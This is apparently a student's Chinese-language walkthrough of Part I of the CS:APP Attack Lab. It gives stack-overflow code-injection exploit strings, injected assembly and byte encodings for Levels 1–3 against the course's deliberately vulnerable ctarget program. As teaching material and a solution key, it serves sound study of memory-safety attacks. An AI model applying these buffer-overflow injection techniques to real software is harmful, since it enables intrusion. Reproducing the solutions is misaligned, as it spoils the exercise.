### 准备

#### Files

-   ctarget: &ensp; An executable program vulnerable to code-injection attacks
-   rtarget: &ensp; An executable program vulnerable to return-oriented-programming attacks
-   cookie.txt: &ensp; An 8-digit hex code that you will use as a unique identifier in your attacks.
-   farm.c: &ensp; The source code of your target's "gadget farm", which you will use in generating return-oriented
    programming attacks.
-   hex2raw: &ensp; A utility to generate attack strings

#### Target Program

=== "C source code"

    ```C
    unsigned getbuf() {
        char buf[BUFFER_SIZE];
        Gets(buf);
        return 1;
    }
    ```

=== "assembly"

    ```objdump
    00000000004017a8 <getbuf>:
        4017a8:	48 83 ec 28          	sub    $0x28,%rsp
        4017ac:	48 89 e7             	mov    %rsp,%rdi
        4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
        4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
        4017b9:	48 83 c4 28          	add    $0x28,%rsp
        4017bd:	c3                   	retq
        4017be:	90                   	nop
        4017bf:	90                   	nop
    ```

`ctarget` 和 `rtarget` 都通过 `getbuf` 从标准输入中读入字符串 (terminated by `\n`) 并存储 (along with a null terminator)，需要注意:

-   exploit string 的任何位置都不能包含 `0x0a` (ascii for `\n`)
-   通过反汇编查看 `BUFFER_SIZE`

#### Using `hex2raw`

将需要的十六进制码转换为字符串作为 `target` 的输入，可以通过以下方式:

1.&ensp;set a series of pipes

```console
cat exploit.txt | ./hex2raw | ./ctarget -q
```

2.&ensp;store the raw string in a file and use I/O redirection

```console
./hex2raw < exploit.txt > exploit-raw.txt
./ctarget < exploit-raw.txt
```

#### Generating Byte Codes

```console
gcc -c example.s
objdump -d example.o > example.d
```

#### 知识回顾

函数调用过程: &ensp; 保存状态 → 传参 → `call` → 开栈 → ... → 释放 → `ret`

### Part I: Code Injection Attacks

用 exploit string 攻击 `ctarget` 程序，`getbuf` 被 `test` 函数调用

```C
void test() {
    int val;
    val = getbuf();
    printf("No exploit.  Getbuf returned 0x%x\n", val);
}
```

通过 `getbuf` 改变 buffer，使其无法安全返回 `test`

#### Level 1

Level1 不要求注入新代码，只需让 `getbuf` 返回到 `touch1`，C rep:

=== "touch1"

    ```C
    void touch1() {
        vlevel = 1;    /* Part of validation protocol */
        printf("Touch1!: You called touch1()\n");
        validate(1);
        exit(0);
    }
    ```

=== "level1.txt"

    ```console
    /* padding 40 bytes */
    ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee
    ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee
    /* first address of touch1() */
    c0 17 40 00 00 00 00
    ```

只需要填充 `0x28` 个字节后，用 `touch1` 的地址 `0x4017c0` 覆盖 `test` 的栈帧，注意小端法

#### Level 2

Level2 需要返回到 `touch2`，返回之前还要调用注入的代码用于传参，使 `val == cookie`

=== "touch2"

    ```C
    void touch2(unsigned val) {
        vlevel = 2;
        if (val == cookie) {
            printf("Touch2!: You called touch2(0x%.8x)\n", val);
            validate(2);
        } elee {
            printf("Misfire: You called touch2(0x%.8x)\n", val);
            fail(2);
        }
        exit(0);
    }
    ```

=== "level2.s"

    ```asm
    pushq  $0x4017ec          # first address of touch2
    mov    $0x59b997fa, %rdi  # cookie
    ret
    ```

=== "level2.d"

    ```objdump
    0000000000000000 <.text>:
        0:	68 ec 17 40 00       	pushq  $0x4017ec
        5:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
        c:	c3                   	retq
    ```

=== "level2.txt"

    ```console
    /* padding 40 bytes */
    ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee
    ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee
    /* injectied codes at 0x5561dca0 + 8 */
    a8 dc 61 55 00 00 00 00
    /* encoding of injected codes */
    68 ec 17 40 00 48 c7 c7 fa 97 b9 59 c3
    ```

通过 gdb 查看 `getbuf` 栈帧尾端的地址为 `0x5561dca0`，然后破坏 `test` 的栈帧，修改返回值，把注入的代码存放在 `0x5561dca8`

#### Level 3

Level3 与 Level2 相似，但需要传一个字符串指针，使 cookie 的字符串形式与传入的字符串相等

=== "touch3"

    ```C
    void touch3(char *sval) {
        vlevel = 3; /* Part of validation protocol */
        if (hexmatch(cookie, sval)) {
            printf("Touch3!: You called touch3(\"%s\")\n", sval);
            validate(3);
        } else {
            printf("Misfire: You called touch3(\"%s\")\n", sval);
            fail(3);
        }
        exit(0);
    }
    ```

=== "hexmatch"

    ```C
    /* Compare string to hex represention of unsigned value */
    int hexmatch(unsigned val, char *sval) {
        char cbuf[110];
        /* Make position of check string unpredictable */
        char *s = cbuf + random() % 100;
        sprintf(s, "%.8x", val);
        return strncmp(sval, s, 9) == 0;
    }
    ```

=== "level3.s"

    ```asm
    pushq  $0x4018fa          # first address of touch3
    mov    $0x5561dca8, %rdi  # address of string constructed manually
    ret
    ```

=== "level3.d"

    ```objdump
    0000000000000000 <.text>:
        0:	68 fa 18 40 00       	pushq  $0x4018fa
        5:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
        c:	c3
    ```

=== "level3.txt"

    ```console
    /* padding: 40 bytes */
    ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee
    ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee
    /* injected codes at 0x5561dca0 + 8 + 9 */
    b1 dc 61 55 00 00 00 00
    /* string format of cookie */
    35 39 62 39 39 37 66 61 00
    /* encoding of injected codes */
    68 fa 18 40 00 48 c7 c7 a8 dc 61 55 c3
    ```

因此在栈帧尾部顺放 cookie 的字符串形式，再放置注入的代码。尽管 `touch3` 调用其他函数，但注入内容都放在了 `test` 的栈帧内，不必担心被破坏。
